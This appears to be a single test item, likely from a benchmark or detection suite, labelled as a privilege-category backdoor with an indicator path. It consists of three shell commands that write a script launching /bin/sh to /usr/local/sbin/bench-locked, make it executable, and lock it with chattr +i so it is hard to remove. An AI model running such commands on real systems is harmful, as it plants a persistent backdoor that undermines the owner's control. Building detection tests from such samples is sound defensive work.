# category: privilege
# title: Backdoor protected with chattr +i
# indicator: /usr/local/sbin/bench-locked
printf '#!/bin/sh\nexec /bin/sh\n' >/usr/local/sbin/bench-locked
chmod 755 /usr/local/sbin/bench-locked
chattr +i /usr/local/sbin/bench-locked
